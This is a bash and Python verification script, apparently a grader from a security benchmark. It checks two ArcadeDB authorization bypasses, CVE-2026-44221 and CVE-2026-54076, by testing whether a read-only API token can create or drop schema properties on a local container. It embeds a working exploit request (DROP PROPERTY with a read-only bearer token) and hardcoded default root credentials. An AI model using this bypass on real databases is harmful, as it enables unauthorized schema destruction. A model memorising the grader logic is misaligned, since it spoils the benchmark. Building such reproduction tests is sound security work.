#!/usr/bin/env bash
# verify.sh --seed|--residual — 0=效果发生 10=未发生 20=环境失败 30=参数错误
# seed: CVE-2026-44221 CREATE PROPERTY via read-only token (schema state).
# residual: CVE-2026-54076 DROP PROPERTY via the same token (inline; no heldout).
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

# Fail closed: submitted token must equal the run's true flag. Seed is schema-only
# (CREATE success does not depend on the flag string); leftover schema_after can
# still contain RUN_FLAG_REF from a prior probe. wrong/stale must not mutate.
if [[ -n "${RUN_FLAG_REF:-}" && "$RUN_FLAG" != "$RUN_FLAG_REF" ]]; then
  echo "verify: rejected wrong/stale submitted flag"
  exit 10
fi

_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$" || true)"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
SVC="${SVC:-$VERSION}"
CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-2480}"
PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" port "$SVC" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
if [[ -z "$PORT" ]]; then
  CID="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" ps -q "$SVC" 2>/dev/null | head -1)"
  if [[ -n "$CID" ]]; then
    PORT="$(docker port "$CID" "$CPORT" 2>/dev/null | head -1 | sed 's/.*://' | tr -d '[:space:]')"
  fi
fi
if [[ -z "$PORT" ]]; then
  echo "verify: no mapped port for $SVC:$CPORT" >&2
  exit 20
fi
export PCB_TARGET_PORT="$PORT"
export PCB_TARGET_BASE="http://127.0.0.1:${PORT}"

if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || "$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)"
  CAND="${CAND:-"{}"}"
  CAND="$("$PY" -c "import json,sys
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
except Exception:
    print(json.dumps({'path': s.strip(), 'to': s.strip(), 'payload': s.strip(), 'css': s.strip()}))" "$CAND")"
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
  "$PY" - "$RUN_FLAG" "$WORK_DIR/cand.json" <<'ADAPTEOF'
import re, sys
flag, p = sys.argv[1], sys.argv[2]
s = open(p, encoding="utf-8", errors="replace").read()
s = re.sub(r'PCBFLAG_[A-Za-z0-9_]+', flag, s)
open(p, "w").write(s)
ADAPTEOF
  export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"
  OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
  echo "${OUT:0:500}"
  JUDGE="${RUN_FLAG_REF:-$RUN_FLAG}"
  printf '%s' "$OUT" | "$PY" -c "
import json, os, sys
raw = sys.stdin.read()
judge = os.environ.get('RUN_FLAG_REF') or os.environ['RUN_FLAG']
try:
    d = json.loads(raw)
except Exception:
    sys.exit(20)
created = bool(d.get('created'))
newprop = str(d.get('new_prop') or '')
# Require THIS probe created the judge-named property. Do not grep schema_after:
# leftover properties from a prior seed would still contain RUN_FLAG_REF.
sys.exit(0 if created and newprop == judge else 10)
" || exit $?
  exit 0
fi

# residual: CVE-2026-54076 — V1 createProperty is gated; dropProperty is not.
# Plant canary named RUN_FLAG_REF as root, DROP it with the submitted token via
# a read-only API token. Success only if submitted == REF and the canary is gone.
export PCB_TARGET_BASE="http://127.0.0.1:${PORT}"
"$PY" - "$VERSION" <<'PYEOF'
import base64, json, os, sys, time, urllib.error, urllib.request, uuid

base = os.environ.get("PCB_TARGET_BASE", "http://127.0.0.1:0")
flag = os.environ.get("RUN_FLAG", "")
ref = os.environ.get("RUN_FLAG_REF", "") or flag
if not flag or base.rstrip("/").endswith(":0"):
    print("verify: missing RUN_FLAG / target port (base=%s)" % base, file=sys.stderr)
    sys.exit(20)
# Fail closed: write+readback only when the submitted token equals the true flag.
if flag != ref:
    print("verify: rejected wrong/stale submitted flag (residual gated)")
    sys.exit(10)
DB, TYPE = "pcb", "Widget"

def req(path, method="GET", body=None, auth=None, timeout=30):
    url = base.rstrip("/") + path
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, method=method)
    r.add_header("Content-Type", "application/json")
    if auth == "root":
        tok = base64.b64encode(b"root:playwithdata").decode()
        r.add_header("Authorization", "Basic " + tok)
    elif auth:
        r.add_header("Authorization", "Bearer " + auth)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:
        return -1, str(e)

def wait_ready(secs=180):
    for _ in range(secs):
        st, _b = req("/api/v1/ready")
        if st in (200, 204):
            return True
        time.sleep(1)
    return False

def root_sql(sql, endpoint="command"):
    return req("/api/v1/%s/%s" % (endpoint, DB), "POST",
               {"language": "sql", "command": sql}, auth="root")

def schema_props():
    st, body = root_sql("SELECT name, properties FROM schema:types WHERE name = '%s'" % TYPE,
                        endpoint="query")
    props = set()
    try:
        for row in json.loads(body).get("result", []):
            for p in row.get("properties", []) or []:
                props.add(p.get("name") if isinstance(p, dict) else p)
    except Exception:
        pass
    return props

if not wait_ready():
    print("verify: arcadedb never became ready (%s)" % base, file=sys.stderr)
    sys.exit(20)
req("/api/v1/server", "POST", {"command": "create database %s" % DB}, auth="root")
root_sql("CREATE DOCUMENT TYPE %s IF NOT EXISTS" % TYPE)
root_sql("CREATE PROPERTY %s.label STRING" % TYPE)
root_sql("CREATE PROPERTY %s.%s STRING" % (TYPE, ref))
st, body = req("/api/v1/server/api-tokens", "POST",
               {"name": "readonly_%s_residual_%s" % (ref, uuid.uuid4().hex[:8]),
                "database": DB,
                "permissions": {"database": [], "types": {"*": {"access": ["readRecord"]}}}},
               auth="root")
token = None
try:
    token = json.loads(body)["result"]["token"]
except Exception:
    pass
if not token:
    print("verify: could not mint read-only token (status=%s body=%s)" % (st, body[:300]),
          file=sys.stderr)
    sys.exit(20)
before = schema_props()
ddl = "DROP PROPERTY %s.%s" % (TYPE, flag)
st, body = req("/api/v1/command/%s" % DB, "POST",
               {"language": "sql", "command": ddl}, auth=token)
after = schema_props()
mutated = (flag == ref) and (ref in before) and (ref not in after) and (200 <= st < 300)
print("verify: ddl=%s ddl_status=%s ref_in_before=%s ref_in_after=%s mutated=%s"
      % (ddl, st, ref in before, ref in after, mutated))
sys.exit(0 if mutated else 10)
PYEOF
exit $?
